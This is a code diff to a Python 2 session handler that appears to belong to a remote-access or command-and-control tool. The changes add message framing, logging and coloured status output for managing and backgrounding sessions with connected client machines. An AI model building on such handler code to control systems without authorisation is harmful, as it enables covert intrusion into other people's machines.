@@ -32,6 +32,7 @@ BAD = Style.BRIGHT + Fore.RED + "\n[-] " + Style.RESET_ALL
 GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] " + Style.RESET_ALL
 
 logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
+logging.critical("----------START OF NEW LOG----------")
 
 class StoppableThread(threading.Thread):
 	"""
@@ -114,13 +115,19 @@ class Transport:
 		
 	def send(self, data):
 		data = self.encrypt(data)
-		try: self.comm_socket.sendall(data)
+		try: self.comm_socket.sendall(data+chr(255))
 		except: pass
 		
 	def recv(self):
 		if self.disconnected: return ""
-		try: data = self.comm_socket.recv(4096)
+		
+		try:
+			data = ""
+			while not data.endswith(chr(255)):
+				data += self.comm_socket.recv(4096)
+			data = data[:-1]
 		except: data = ""
+		
 		if not data:
 			self.comm_socket.close()
 			logging.error("Client #"+str(self.client_id)+" disconnected")
@@ -157,7 +164,7 @@ class Transport:
 				
 	def signal(self, data):
 		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data)
-		self.master_queue.put(chr(254)+data)
+		self.master_queue.put(self.signal_channel.id+data)
 				
 	def create_channel(self, id):
 		self.channels[id] = Channel(id, self.master_queue)
@@ -189,7 +196,7 @@ class Client:
 			try:
 				user_input = raw_input()
 			except KeyboardInterrupt:
-				print "\nBackgrounding session."
+				print INFO + "Backgrounding session."
 				return True
 			logging.debug("Got user input: "+user_input)
 
@@ -198,11 +205,13 @@ class Client:
 			data = self.recv()
 			logging.debug("Result of user input: "+data)
 			if data == "CONN_LOST":
-				print "Client Disconnected"
+				print BAD + "Client Disconnected"
 				return False
 			elif data.startswith("BG_NEW_SESH"):
-				print "A new session should appear within 30 seconds."
+				print GOOD + "A new session should appear within 30 seconds."
 				return True
+
+			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
 			sys.stdout.write(data)
 		
 class Handler:
@@ -277,7 +286,7 @@ class Handler:
 				for c in self.clients:
 					print "["+str(c.id)+"]: " + c.transport.address + ":" + str(c.transport.port)
 					
-				print"\n========================"
+				print "========================"
 				
 			elif user_input.startswith("i"):
 				self.interacting = True
